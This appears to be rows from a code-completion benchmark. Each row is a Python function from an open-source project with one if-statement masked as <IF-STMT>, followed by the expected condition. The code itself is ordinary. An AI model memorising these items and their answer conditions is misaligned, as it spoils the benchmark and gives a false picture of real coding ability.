1289,"def iter_ReassignParameters(self, inputNode, variables, nodeByID):<tab>for node in inputNode.getReassignParameterNodes(nodeByID):<tab><tab>yield from iterNodeCommentLines(node)<tab><tab>yield from iterInputConversionLines(node, variables)<tab><tab>socket = node.inputs[0]<tab><tab>if socket.isUnlinked and socket.isCopyable():<tab><tab><tab>expression = getCopyExpression(socket, variables)<tab><tab>else:<tab><tab><tab>expression = variables[socket]<tab><tab><IF-STMT><tab><tab><tab>conditionPrefix = """"<tab><tab>else:<tab><tab><tab>conditionPrefix = ""if {}: "".format(variables[node.conditionSocket])<tab><tab>yield ""{}{} = {}"".format(<tab><tab><tab>conditionPrefix, variables[node.linkedParameterSocket], expression<tab><tab>)",if node . conditionSocket is None :,192
1290,"def init_weight(self):<tab>if self.pretrained is not None:<tab><tab>load_entire_model(self, self.pretrained)<tab>else:<tab><tab>for sublayer in self.sublayers():<tab><tab><tab>if isinstance(sublayer, nn.Conv2D):<tab><tab><tab><tab>kaiming_normal_init(sublayer.weight)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>kaiming_normal_init(sublayer.weight)","elif isinstance ( sublayer , ( nn . BatchNorm , nn . SyncBatchNorm ) ) :",120
1291,def logic():<tab>while 1:<tab><tab><IF-STMT><tab><tab><tab>yield reset.posedge<tab><tab>for i in range(20):<tab><tab><tab>yield clock.posedge<tab><tab><tab>if enable:<tab><tab><tab><tab>count.next = i<tab><tab>j = 1<tab><tab>while j < 25:<tab><tab><tab>if enable:<tab><tab><tab><tab>yield clock.posedge<tab><tab><tab>yield clock.posedge<tab><tab><tab>count.next = 2 * j<tab><tab><tab>j += 1,if reset == ACTIVE_LOW :,123
1292,"def clean_log_messages(result_data):<tab>for idx in range(len(result_data[""executePlan""][""stepEvents""])):<tab><tab>message = result_data[""executePlan""][""stepEvents""][idx].get(""message"")<tab><tab><IF-STMT><tab><tab><tab>result_data[""executePlan""][""stepEvents""][idx][""message""] = re.sub(<tab><tab><tab><tab>r""(\d+(\.\d+)?)"", ""{N}"", message<tab><tab><tab>)<tab>return result_data",if message is not None :,115
1293,"def headerData(self, section, orientation, role=Qt.DisplayRole):<tab>if role == Qt.TextAlignmentRole:<tab><tab>if orientation == Qt.Horizontal:<tab><tab><tab>return to_qvariant(int(Qt.AlignHCenter | Qt.AlignVCenter))<tab><tab>return to_qvariant(int(Qt.AlignRight | Qt.AlignVCenter))<tab>if role != Qt.DisplayRole:<tab><tab>return to_qvariant()<tab>if orientation == Qt.Horizontal:<tab><tab>if section == NAME:<tab><tab><tab>return to_qvariant(""Name"")<tab><tab>elif section == VERSION:<tab><tab><tab>return to_qvariant(""Version"")<tab><tab><IF-STMT><tab><tab><tab>return to_qvariant(""Action"")<tab><tab>elif section == DESCRIPTION:<tab><tab><tab>return to_qvariant(""Description"")<tab>return to_qvariant()",elif section == ACTION :,192
1294,"def _gather_infos(self):<tab># Carry over information from previous game step.<tab>if self._prev_state is not None:<tab><tab>for attr in self._tracked_infos:<tab><tab><tab>self.state[attr] = self.state.get(attr) or self._prev_state.get(attr)<tab>for info in [""score"", ""moves""]:<tab><tab><IF-STMT><tab><tab><tab>self.state[info] = int(self.state[info].strip())<tab>self.state[""won""] = ""*** The End ***"" in self.state[""feedback""]<tab>self.state[""lost""] = ""*** You lost! ***"" in self.state[""feedback""]",if self . state [ info ] is not None and type ( self . state [ info ] ) is not int :,180
1295,"def calc_parity(sig, kind):<tab>if kind in (""zero"", ""none""):<tab><tab>return C(0, 1)<tab>elif kind == ""one"":<tab><tab>return C(1, 1)<tab>else:<tab><tab>bits, _ = value_bits_sign(sig)<tab><tab>even_parity = sum([sig[b] for b in range(bits)]) & 1<tab><tab><IF-STMT><tab><tab><tab>return ~even_parity<tab><tab>elif kind == ""even"":<tab><tab><tab>return even_parity<tab><tab>else:<tab><tab><tab>assert False","if kind == ""odd"" :",141
1296,"def tool(self, **kwds):<tab>process_definition = kwds.get(""process_definition"", None)<tab>if process_definition is None:<tab><tab>raw_process_reference = kwds.get(""raw_process_reference"", None)<tab><tab><IF-STMT><tab><tab><tab>raw_process_reference = self.raw_process_reference(kwds[""path""])<tab><tab>process_definition = self.process_definition(raw_process_reference)<tab>tool = load_tool.make_tool(<tab><tab>process_definition.uri,<tab><tab>process_definition.loading_context,<tab>)<tab>return tool",if raw_process_reference is None :,147
1297,def context(self):<tab># Needed to avoid Translate Toolkit construct ID<tab># as context\04source<tab>if self.template is not None:<tab><tab>if self.template.id:<tab><tab><tab>return self.template.id<tab><tab><IF-STMT><tab><tab><tab>return self.template.context<tab><tab>return self.template.getid()<tab>return self.unescape_csv(self.mainunit.getcontext()),if self . template . context :,103
1298,"def test_six_thread_safety():<tab>_reload_six()<tab>with patch(<tab><tab>""botocore.vendored.six.moves.__class__.__setattr__"", wraps=_wrapped_setattr<tab>):<tab><tab>threads = []<tab><tab>for i in range(2):<tab><tab><tab>t = _ExampleThread()<tab><tab><tab>threads.append(t)<tab><tab><tab>t.start()<tab><tab>while threads:<tab><tab><tab>t = threads.pop()<tab><tab><tab>t.join()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>six.reraise(*t.exc_info)",if t . exc_info :,144
1299,"def _handle_js_events(self, change):<tab>if self.js_events:<tab><tab>if self.eventHandlers:<tab><tab><tab>for event in self.js_events:<tab><tab><tab><tab>event_name = event[""name""]<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.eventHandlers[event_name](event[""detail""])<tab><tab># clears the event queue.<tab><tab>self.js_events = []",if event_name in self . eventHandlers :,110
1300,"def single_discriminator(x, filters=128, kernel_size=8, strides=4, pure_mean=False):<tab>""""""A simple single-layer convolutional discriminator.""""""<tab>with tf.variable_scope(""discriminator""):<tab><tab>net = layers().Conv2D(<tab><tab><tab>filters, kernel_size, strides=strides, padding=""SAME"", name=""conv1""<tab><tab>)(x)<tab><tab><IF-STMT><tab><tab><tab>net = tf.reduce_mean(net, [1, 2])<tab><tab>else:<tab><tab><tab>net = mean_with_attention(net, ""mean_with_attention"")<tab><tab>return net",if pure_mean :,148
1301,"def find_path(self, from_location, to_location):<tab>end = to_location<tab>f_node = self.mh.get_node(from_location)<tab>self.on.append(f_node)<tab>self.o.append(f_node.lid)<tab>next_node = f_node<tab>counter = 0  # a bail-out counter<tab>while next_node is not None:<tab><tab><IF-STMT><tab><tab><tab>break  # no path found under limit<tab><tab>finish = self._handle_node(next_node, end)<tab><tab>if finish:<tab><tab><tab>return self._trace_path(finish)<tab><tab>next_node = self._get_best_open_node()<tab><tab>counter += 1<tab>return None",if counter > 10000 :,182
1302,"def format_var_dict(dct, indent=4, max_width=80):<tab>lines = []<tab>pre = "" "" * indent<tab>for key, value in dct.items():<tab><tab>line = pre + key + "" = "" + repr(value)<tab><tab><IF-STMT><tab><tab><tab>line = line[: max_width - 3] + ""...""<tab><tab><tab>try:<tab><tab><tab><tab>value_len = len(value)<tab><tab><tab>except:<tab><tab><tab><tab>pass<tab><tab><tab>else:<tab><tab><tab><tab>line += ""\n"" + pre + ""len(%s) = %s"" % (key, value_len)<tab><tab>lines.append(line)<tab>return ""\n"".join(lines)",if len ( line ) > max_width :,176
1303,"def _recursive_name_seach(self, layer_names, layer, pre_name, depth):<tab>for name, module in layer.named_children():<tab><tab>nname = pre_name + ""_"" + name if pre_name != """" else name<tab><tab><IF-STMT><tab><tab><tab>if self._wrap_layer_check(module, name, nname):<tab><tab><tab><tab>layer_names.append(nname)<tab><tab>if self.depth is None or depth <= self.depth:<tab><tab><tab>if len(list(layer.named_children())) > 0:<tab><tab><tab><tab>self._recursive_name_seach(layer_names, module, nname, depth + 1)<tab>return layer_names",if depth == self . depth or self . depth is None :,175
1304,"def finished_at(self):<tab>f = self.metadata_get([""State"", ""FinishedAt""])<tab>if f:<tab><tab>f = f[:26]<tab><tab><IF-STMT><tab><tab><tab>return DINOSAUR_TIME<tab><tab>finished_at = datetime.datetime.strptime(f, ISO_DATETIME_PARSE_STRING)<tab><tab>return finished_at","if f == ""0001-01-01T00:00:00Z"" :",100
1305,"def write_bool(self, bool):<tab>if (<tab><tab>self._bool_fid<tab><tab>and self._bool_fid > self._last_fid<tab><tab>and self._bool_fid - self._last_fid <= 15<tab>):<tab><tab><IF-STMT><tab><tab><tab>ctype = CompactType.TRUE<tab><tab>else:<tab><tab><tab>ctype = CompactType.FALSE<tab><tab>self._write_field_header(ctype, self._bool_fid)<tab>else:<tab><tab>if bool:<tab><tab><tab>self.write_byte(CompactType.TRUE)<tab><tab>else:<tab><tab><tab>self.write_byte(CompactType.FALSE)",if bool :,156
1306,"def update(self, topLeft, bottomRight):<tab>if self._updating:<tab><tab># We are currently putting data in the model, so no updates<tab><tab>return<tab>if self._index:<tab><tab>if topLeft.row() <= self._index.row() <= bottomRight.row():<tab><tab><tab>self.updateText()<tab>elif self._indexes:<tab><tab>update = False<tab><tab>for i in self._indexes:<tab><tab><tab>if topLeft.row() <= i.row() <= bottomRight.row():<tab><tab><tab><tab>update = True<tab><tab><IF-STMT><tab><tab><tab>self.updateText()",if update :,144
1307,"def _preprocess_add_items(self, items):<tab>""""""Split the items into two lists of path strings and BaseEntries.""""""<tab>paths = []<tab>entries = []<tab>for item in items:<tab><tab><IF-STMT><tab><tab><tab>paths.append(self._to_relative_path(item))<tab><tab>elif isinstance(item, (Blob, Submodule)):<tab><tab><tab>entries.append(BaseIndexEntry.from_blob(item))<tab><tab>elif isinstance(item, BaseIndexEntry):<tab><tab><tab>entries.append(item)<tab><tab>else:<tab><tab><tab>raise TypeError(""Invalid Type: %r"" % item)<tab># END for each item<tab>return (paths, entries)","if isinstance ( item , string_types ) :",165
1308,def ping_all():<tab>for l in _all_listeners.values():<tab><tab>count = l.receiver.count()<tab><tab><IF-STMT><tab><tab><tab>for dev in l.receiver:<tab><tab><tab><tab>dev.ping()<tab><tab><tab><tab>l._status_changed(dev)<tab><tab><tab><tab>count -= 1<tab><tab><tab><tab>if not count:<tab><tab><tab><tab><tab>break,if count :,92
1309,"def stage_node_dot(g, stage):<tab>""""""Create a stage node.""""""<tab>with g.subgraph(name=""cluster_"" + stage[""id""]) as subgraph:<tab><tab>subgraph.attr(label=stage[""name""])<tab><tab><IF-STMT><tab><tab><tab>for itervar in stage[""all_itervars""]:<tab><tab><tab><tab>iv_type = itervar[""itervar_type""]<tab><tab><tab><tab>itervar_node_dot(subgraph, itervar, iv_type, itervar[""index""])<tab><tab><tab>for rel in stage[""relations""]:<tab><tab><tab><tab>node_id = rel[""id""]<tab><tab><tab><tab>itervar_relation_dot(subgraph, rel, node_id)<tab><tab>else:<tab><tab><tab>subgraph.node(stage[""name""] + ""_placeholder"", style=""invis"")","if stage [ ""all_itervars"" ] :",190
1310,"def run() -> None:<tab>nonlocal state, timeout<tab>while True:<tab><tab>if timeout > 0.0:<tab><tab><tab>disposed.wait(timeout)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>time: datetime = self.now<tab><tab>state = action(state)<tab><tab>timeout = seconds - (self.now - time).total_seconds()",if disposed . is_set ( ) :,92
1311,"def increment(s):<tab>if not s:<tab><tab>return ""1""<tab>for sequence in string.digits, string.lowercase, string.uppercase:<tab><tab>lastc = s[-1]<tab><tab>if lastc in sequence:<tab><tab><tab>i = sequence.index(lastc) + 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if len(s) == 1:<tab><tab><tab><tab><tab>s = sequence[0] * 2<tab><tab><tab><tab><tab>if s == ""00"":<tab><tab><tab><tab><tab><tab>s = ""10""<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>s = increment(s[:-1]) + sequence[0]<tab><tab><tab>else:<tab><tab><tab><tab>s = s[:-1] + sequence[i]<tab><tab><tab>return s<tab>return s  # Don't increment",if i >= len ( sequence ) :,196
1312,"def Import(self, patch, force):<tab>if not patch.get(""file""):<tab><tab><IF-STMT><tab><tab><tab>raise PatchError(""Patch file must be specified in patch import."")<tab><tab>else:<tab><tab><tab>patch[""file""] = bb.fetch2.localpath(patch[""remote""], self.d)<tab>for param in PatchSet.defaults:<tab><tab>if not patch.get(param):<tab><tab><tab>patch[param] = PatchSet.defaults[param]<tab>if patch.get(""remote""):<tab><tab>patch[""file""] = self.d.expand(bb.fetch2.localpath(patch[""remote""], self.d))<tab>patch[""filemd5""] = bb.utils.md5_file(patch[""file""])","if not patch . get ( ""remote"" ) :",176
1313,"def _setReadyState(self, state: str) -> None:<tab>if state != self.__readyState:<tab><tab>self.__log_debug(""- %s -> %s"", self.__readyState, state)<tab><tab>self.__readyState = state<tab><tab><IF-STMT><tab><tab><tab>self.emit(""open"")<tab><tab>elif state == ""closed"":<tab><tab><tab>self.emit(""close"")<tab><tab><tab># no more events will be emitted, so remove all event listeners<tab><tab><tab># to facilitate garbage collection.<tab><tab><tab>self.remove_all_listeners()","if state == ""open"" :",131
1314,def count_brokers(self):<tab>self.nb_brokers = 0<tab>for broker in self.brokers:<tab><tab>if not broker.spare:<tab><tab><tab>self.nb_brokers += 1<tab>for realm in self.higher_realms:<tab><tab>for broker in realm.brokers:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.nb_brokers += 1,if not broker . spare and broker . manage_sub_realms :,118
1315,"def _refresh(self):<tab>self.uiProfileSelectComboBox.clear()<tab>self.uiProfileSelectComboBox.addItem(""default"")<tab>try:<tab><tab><IF-STMT><tab><tab><tab>for profile in sorted(os.listdir(self.profiles_path)):<tab><tab><tab><tab>if not profile.startswith("".""):<tab><tab><tab><tab><tab>self.uiProfileSelectComboBox.addItem(profile)<tab>except OSError:<tab><tab>pass",if os . path . exists ( self . profiles_path ) :,107
1316,"def run(self):<tab>for k, v in iteritems(self.objs):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if v[""_class""] == ""Dataset"" and v[""task_type""] == ""Communication"":<tab><tab><tab>try:<tab><tab><tab><tab>params = json.loads(v[""task_type_parameters""])<tab><tab><tab>except json.JSONDecodeError:<tab><tab><tab><tab>pass<tab><tab><tab>else:<tab><tab><tab><tab>if len(params) == 1:<tab><tab><tab><tab><tab>params.extend([""stub"", ""fifo_io""])<tab><tab><tab><tab>v[""task_type_parameters""] = json.dumps(params)<tab>return self.objs","if k . startswith ( ""_"" ) :",158
1317,"def _listen(self, consumer_id: str) -> AsyncIterable[Any]:<tab>try:<tab><tab>while True:<tab><tab><tab>if self._listening:<tab><tab><tab><tab>async for msg in self._listen_to_queue(consumer_id):<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>yield msg<tab><tab><tab><tab>await asyncio.sleep(0.5)<tab><tab><tab>else:<tab><tab><tab><tab>async for msg in self._listen_to_ws():<tab><tab><tab><tab><tab>yield msg<tab>except asyncio.CancelledError:<tab><tab>pass<tab>except Exception as e:<tab><tab>raise e",if msg is not None :,153
1318,"def recv(self, bufsiz, flags=0):<tab>d = self._sock.recv(bufsiz, flags)<tab>if self.replace_pattern and b"" HTTP/1.1\r\n"" in d:<tab><tab>line_end = d.find(b""\r\n"")<tab><tab>req_line = d[:line_end]<tab><tab>words = req_line.split()<tab><tab><IF-STMT><tab><tab><tab>method, url, http_version = words<tab><tab><tab>url = url.replace(self.replace_pattern[0], self.replace_pattern[1])<tab><tab><tab>d = b""%s %s %s"" % (method, url, http_version) + d[line_end:]<tab>return d",if len ( words ) == 3 :,178
1319,"def Import(self, patch, force):<tab>if not patch.get(""file""):<tab><tab>if not patch.get(""remote""):<tab><tab><tab>raise PatchError(""Patch file must be specified in patch import."")<tab><tab>else:<tab><tab><tab>patch[""file""] = bb.fetch2.localpath(patch[""remote""], self.d)<tab>for param in PatchSet.defaults:<tab><tab><IF-STMT><tab><tab><tab>patch[param] = PatchSet.defaults[param]<tab>if patch.get(""remote""):<tab><tab>patch[""file""] = self.d.expand(bb.fetch2.localpath(patch[""remote""], self.d))<tab>patch[""filemd5""] = bb.utils.md5_file(patch[""file""])",if not patch . get ( param ) :,176
1320,"def delete(post_id):<tab>blogging_engine = _get_blogging_engine(current_app)<tab>storage = blogging_engine.storage<tab>post = storage.get_post_by_id(post_id)<tab>if (post is not None) and (current_user.get_id() == post[""user_id""]):<tab><tab>success = storage.delete_post(post_id)<tab><tab><IF-STMT><tab><tab><tab>flash(""Your post was successfully deleted"", ""info"")<tab><tab>else:<tab><tab><tab>flash(""Something went wrong while deleting your post"", ""warning"")<tab>else:<tab><tab>flash(""You do not have the rights to delete this post"", ""warning"")<tab>return redirect(url_for(""blog_app.index""))",if success :,177
1321,"def update_schema_configs(state, schema):<tab>RegistrationSchema = state.get_model(""osf"", ""registrationschema"")<tab>for rs in RegistrationSchema.objects.all():<tab><tab>if rs.schema.get(""description"", False):<tab><tab><tab>rs.description = rs.schema[""description""]<tab><tab><IF-STMT><tab><tab><tab>rs.config = rs.schema[""config""]<tab><tab>rs.save()","if rs . schema . get ( ""config"" , False ) :",108
1322,"def set_payload(self, value):<tab>del self[""payload""]<tab>if isinstance(value, ElementBase):<tab><tab><IF-STMT><tab><tab><tab>self.init_plugin(value.plugin_attrib, existing_xml=value.xml)<tab><tab>self.xml.append(value.xml)<tab>else:<tab><tab>self.xml.append(value)",if value . tag_name ( ) in self . plugin_tag_map :,98
1323,"def getCellPropertyNames_aux(self, col_id):<tab>if col_id == ""name"":<tab><tab>if self.image_icon == ""places_busy"":<tab><tab><tab>return [""places_busy""]<tab><tab>baseName = self.image_icon<tab><tab><IF-STMT><tab><tab><tab>return [baseName + ""_open""]<tab><tab>else:<tab><tab><tab>return [baseName + ""_closed""]<tab>return []",if self . isOpen :,102
1324,"def one_xmm_reg_imm8(ii):  # also allows SSE4 2-imm8 instr<tab>i, j, n = 0, 0, 0<tab>for op in _gen_opnds(ii):<tab><tab>if op_reg(op) and op_xmm(op):<tab><tab><tab>n += 1<tab><tab><IF-STMT><tab><tab><tab>i += 1<tab><tab>elif op_imm8_2(op):<tab><tab><tab>j += 1<tab><tab>else:<tab><tab><tab>return False<tab>return n == 1 and i == 1 and j <= 1",elif op_imm8 ( op ) :,141
1325,"def step(self, action):<tab>""""""Repeat action, sum reward, and max over last observations.""""""<tab>total_reward = 0.0<tab>done = None<tab>for i in range(self._skip):<tab><tab>obs, reward, done, info = self.env.step(action)<tab><tab><IF-STMT><tab><tab><tab>self._obs_buffer[0] = obs<tab><tab>if i == self._skip - 1:<tab><tab><tab>self._obs_buffer[1] = obs<tab><tab>total_reward += reward<tab><tab>if done:<tab><tab><tab>break<tab># Note that the observation on the done=True frame doesn't matter.<tab>max_frame = self._obs_buffer.max(axis=0)<tab>return max_frame, total_reward, done, info",if i == self . _skip - 2 :,187
1326,"def assertNodeSequenceEqual(<tab>self,<tab>seq1: Sequence[cst.CSTNode],<tab>seq2: Sequence[cst.CSTNode],<tab>msg: Optional[str] = None,) -> None:<tab>suffix = """" if msg is None else f""\n{msg}""<tab>if len(seq1) != len(seq2):<tab><tab>raise AssertionError(f""\n{seq1!r}\nis not deeply equal to \n{seq2!r}{suffix}"")<tab>for node1, node2 in zip(seq1, seq2):<tab><tab><IF-STMT><tab><tab><tab>raise AssertionError(<tab><tab><tab><tab>f""\n{seq1!r}\nis not deeply equal to \n{seq2!r}{suffix}""<tab><tab><tab>)",if not node1 . deep_equals ( node2 ) :,189
1327,"def close(self):<tab>if self._file_writer is not None:<tab><tab><IF-STMT><tab><tab><tab>flat_result = flatten_dict(self.last_result, delimiter=""/"")<tab><tab><tab>scrubbed_result = {<tab><tab><tab><tab>k: value<tab><tab><tab><tab>for k, value in flat_result.items()<tab><tab><tab><tab>if isinstance(value, tuple(VALID_SUMMARY_TYPES))<tab><tab><tab>}<tab><tab><tab>self._try_log_hparams(scrubbed_result)<tab><tab>self._file_writer.close()",if self . trial and self . trial . evaluated_params and self . last_result :,146
1328,"def check_space(arr, task_id):<tab>for a in arr:<tab><tab>if a.startswith(""hadoop jar""):<tab><tab><tab>found = False<tab><tab><tab>for x in shlex.split(a):<tab><tab><tab><tab>if task_id in x:<tab><tab><tab><tab><tab>found = True<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise AssertionError",if not found :,86
1329,"def is_valid_block(self):<tab>""""""check wheter the block is valid in the current position""""""<tab>for i in range(self.block.x):<tab><tab>for j in range(self.block.x):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if self.block.pos.x + i < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.x + i >= COLUMNS:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.block.pos.y + j < 0:<tab><tab><tab><tab><tab>return False<tab><tab><tab><tab>if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False):<tab><tab><tab><tab><tab>return False<tab>return True","if self . block . get ( i , j ) :",192
1330,"def undo_block_stop(self):<tab>if self.undoblock.bump_depth(-1) == 0:<tab><tab>cmd = self.undoblock<tab><tab>self.undoblock = 0<tab><tab><IF-STMT><tab><tab><tab>if len(cmd) == 1:<tab><tab><tab><tab># no need to wrap a single cmd<tab><tab><tab><tab>cmd = cmd.getcmd(0)<tab><tab><tab># this blk of cmds, or single cmd, has already<tab><tab><tab># been done, so don't execute it again<tab><tab><tab>self.addcmd(cmd, 0)",if len ( cmd ) > 0 :,139
1331,"def __(task: pipelines.Task):<tab>if not acl.current_user_has_permission(views.acl_resource):<tab><tab>return bootstrap.card(<tab><tab><tab>header_left=""Commands"", body=acl.inline_permission_denied_message()<tab><tab>)<tab>else:<tab><tab>commands_card = bootstrap.card(<tab><tab><tab>header_left=""Commands"",<tab><tab><tab>fixed_header_height=True,<tab><tab><tab>sections=[_render_command(command) for command in task.commands],<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return [<tab><tab><tab><tab>bootstrap.card(header_left=f""Max retries: {task.max_retries}""),<tab><tab><tab><tab>commands_card,<tab><tab><tab>]<tab><tab>else:<tab><tab><tab>return commands_card",if task . max_retries :,196
1332,"def closeEvent(self, e=None):<tab>""""""Save settings and remove registered logging handler""""""<tab>if self.editor.isModified():<tab><tab># ask if user wants to save<tab><tab>if self.wants_save():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>e.accept()<tab><tab><tab>else:<tab><tab><tab><tab># saving error or user canceled<tab><tab><tab><tab>e.ignore()<tab><tab>else:<tab><tab><tab># discard changes<tab><tab><tab>e.accept()<tab>else:<tab><tab># unchanged<tab><tab>e.accept()",if self . save ( ) :,133
1333,"def _merge(self, a, b, path=None):<tab>""""""Merge two dictionaries, from http://stackoverflow.com/questions/7204805/dictionaries-of-dictionaries-merge""""""<tab>if path is None:<tab><tab>path = []<tab>for key in b:<tab><tab><IF-STMT><tab><tab><tab>if isinstance(a[key], dict) and isinstance(b[key], dict):<tab><tab><tab><tab>self._merge(a[key], b[key], path + [str(key)])<tab><tab><tab>elif a[key] == b[key]:<tab><tab><tab><tab>pass  # same leaf value<tab><tab><tab>else:<tab><tab><tab><tab>raise Exception(""Conflict at %s"" % ""."".join(path + [str(key)]))<tab><tab>else:<tab><tab><tab>a[key] = b[key]<tab>return a",if key in a :,196
1334,"def _flags_helper(conf, atom, new_flags, test=False):<tab>try:<tab><tab>new_flags = __salt__[""portage_config.get_missing_flags""](conf, atom, new_flags)<tab>except Exception:  # pylint: disable=broad-except<tab><tab>import traceback<tab><tab>return {""result"": False, ""comment"": traceback.format_exc()}<tab>if new_flags:<tab><tab>old_flags = __salt__[""portage_config.get_flags_from_package_conf""](conf, atom)<tab><tab><IF-STMT><tab><tab><tab>__salt__[""portage_config.append_to_package_conf""](conf, atom, new_flags)<tab><tab>return {""result"": True, ""changes"": {""old"": old_flags, ""new"": new_flags}}<tab>return {""result"": None}",if not test :,197
1335,"def _confirm_deps(self, trans):<tab>if [pkgs for pkgs in trans.dependencies if pkgs]:<tab><tab>dia = AptConfirmDialog(trans, parent=self.parent)<tab><tab>res = dia.run()<tab><tab>dia.hide()<tab><tab>if res != Gtk.ResponseType.OK:<tab><tab><tab>log.debug(""Response is: %s"" % res)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>log.debug(""Finish_handler..."")<tab><tab><tab><tab>self.finish_handler(trans, 0, self.data)<tab><tab><tab>return<tab>self._run_transaction(trans)",if self . finish_handler :,147
1336,def get_supported_extensions(self):<tab>for item in self.get_subclasses():<tab><tab>instance = item()<tab><tab><IF-STMT><tab><tab><tab>for ext in instance.supports_extensions:<tab><tab><tab><tab>self.extractors.update({instance.cls_name: instance})<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>self.extractors_by_extension[ext].append(instance)<tab><tab><tab><tab>except KeyError:<tab><tab><tab><tab><tab>self.extractors_by_extension[ext] = [instance],if instance . check ( ) :,126
1337,"def find_module(self, fullname, path=None):<tab># Check for local modules first...<tab>localname = fullname.split(""."")[-1]<tab>name, ext = os.path.splitext(localname)<tab>try:<tab><tab>fobj, filename, typeinfo = imp.find_module(name, path)<tab>except ImportError:<tab><tab>logger.info(""Dcode Searching: %s (%s)"", name, path)<tab><tab>pymod = self.proxy.getPythonModule(fullname, path)<tab><tab><IF-STMT><tab><tab><tab>logger.info(""Dcode Loaded: %s"", fullname)<tab><tab><tab>return DcodeLoader(*pymod)",if pymod :,155
1338,def run(self):<tab>try:<tab><tab>self.server_sock = self._create_socket_and_bind()<tab><tab># in case self.port = 0<tab><tab>self.port = self.server_sock.getsockname()[1]<tab><tab>self.ready_event.set()<tab><tab>self._handle_requests()<tab><tab><IF-STMT><tab><tab><tab>self.wait_to_close_event.wait(self.WAIT_EVENT_TIMEOUT)<tab>finally:<tab><tab>self.ready_event.set()  # just in case of exception<tab><tab>self._close_server_sock_ignore_errors()<tab><tab>self.stop_event.set(),if self . wait_to_close_event :,163
1339,"def connection(self, commit_on_success=False):<tab>with self._lock:<tab><tab>if self._bulk_commit:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._pending_connection = sqlite.connect(self.filename)<tab><tab><tab>con = self._pending_connection<tab><tab>else:<tab><tab><tab>con = sqlite.connect(self.filename)<tab><tab>try:<tab><tab><tab>if self.fast_save:<tab><tab><tab><tab>con.execute(""PRAGMA synchronous = 0;"")<tab><tab><tab>yield con<tab><tab><tab>if commit_on_success and self.can_commit:<tab><tab><tab><tab>con.commit()<tab><tab>finally:<tab><tab><tab>if not self._bulk_commit:<tab><tab><tab><tab>con.close()",if self . _pending_connection is None :,182
1340,"def getReceiptInfo(pkgname):<tab>""""""Get receipt info from a package""""""<tab>info = []<tab>if hasValidPackageExt(pkgname):<tab><tab>display.display_debug2(""Examining %s"" % pkgname)<tab><tab><IF-STMT>  # new flat package<tab><tab><tab>info = getFlatPackageInfo(pkgname)<tab><tab>if os.path.isdir(pkgname):  # bundle-style package?<tab><tab><tab>info = getBundlePackageInfo(pkgname)<tab>elif pkgname.endswith("".dist""):<tab><tab>info = parsePkgRefs(pkgname)<tab>return info",if os . path . isfile ( pkgname ) :,143
1341,"def test_gen_speed(gen_func):<tab>cur_time = time.time()<tab>for idx, _ in enumerate(gen_func()):<tab><tab>log.info(""iter %s: %s s"" % (idx, time.time() - cur_time))<tab><tab>cur_time = time.time()<tab><tab><IF-STMT><tab><tab><tab>break",if idx == 100 :,87
1342,"def __init__(self, *args, **kwargs):<tab>if not quickjs_available:<tab><tab>msg = ""No supported QuickJS package found on custom python environment!""<tab><tab><IF-STMT><tab><tab><tab>msg += "" Please install python package quickjs or use ChakraJSEngine.""<tab><tab>elif external_interpreter:<tab><tab><tab>msg += "" Please install python package quickjs or use ExternalJSEngine.""<tab><tab>else:<tab><tab><tab>msg += "" Please install python package quickjs.""<tab><tab>raise RuntimeError(msg)<tab>self._context = self.Context(self)<tab>InternalJSEngine.__init__(self, *args, **kwargs)",if chakra_available :,156
1343,"def _draw_nodes(self, cr, bounding, highlight_items):<tab>highlight_nodes = []<tab>for element in highlight_items:<tab><tab>if isinstance(element, Edge):<tab><tab><tab>highlight_nodes.append(element.src)<tab><tab><tab>highlight_nodes.append(element.dst)<tab><tab>else:<tab><tab><tab>highlight_nodes.append(element)<tab>for node in self.nodes:<tab><tab><IF-STMT><tab><tab><tab>node._draw(cr, highlight=(node in highlight_nodes), bounding=bounding)",if bounding is None or node . _intersects ( bounding ) :,134
1344,"def upgrade():<tab>bind = op.get_bind()<tab>session = db.Session(bind=bind)<tab>for slc in session.query(Slice).filter(Slice.viz_type.like(""deck_%"")):<tab><tab>params = json.loads(slc.params)<tab><tab><IF-STMT><tab><tab><tab>params[""spatial""] = {<tab><tab><tab><tab>""lonCol"": params.get(""longitude""),<tab><tab><tab><tab>""latCol"": params.get(""latitude""),<tab><tab><tab><tab>""type"": ""latlong"",<tab><tab><tab>}<tab><tab><tab>del params[""latitude""]<tab><tab><tab>del params[""longitude""]<tab><tab>slc.params = json.dumps(params)<tab><tab>session.merge(slc)<tab><tab>session.commit()<tab>session.close()","if params . get ( ""latitude"" ) :",189
1345,"def list_completers():<tab>""""""List the active completers""""""<tab>o = ""Registered Completer Functions: \n""<tab>_comp = xsh_session.completers<tab>ml = max((len(i) for i in _comp), default=0)<tab>_strs = []<tab>for c in _comp:<tab><tab><IF-STMT><tab><tab><tab>doc = ""No description provided""<tab><tab>else:<tab><tab><tab>doc = "" "".join(_comp[c].__doc__.split())<tab><tab>doc = justify(doc, 80, ml + 3)<tab><tab>_strs.append(""{: >{}} : {}"".format(c, ml, doc))<tab>return o + ""\n"".join(_strs) + ""\n""",if _comp [ c ] . __doc__ is None :,173
1346,"def test_numeric_literals(self):<tab>@udf(BigIntVal(FunctionContext, SmallIntVal))<tab>def fn(context, a):<tab><tab>if a is None:<tab><tab><tab>return 1729<tab><tab><IF-STMT><tab><tab><tab>return None<tab><tab>elif a < 10:<tab><tab><tab>return a + 5<tab><tab>else:<tab><tab><tab>return a * 2",elif a < 0 :,92
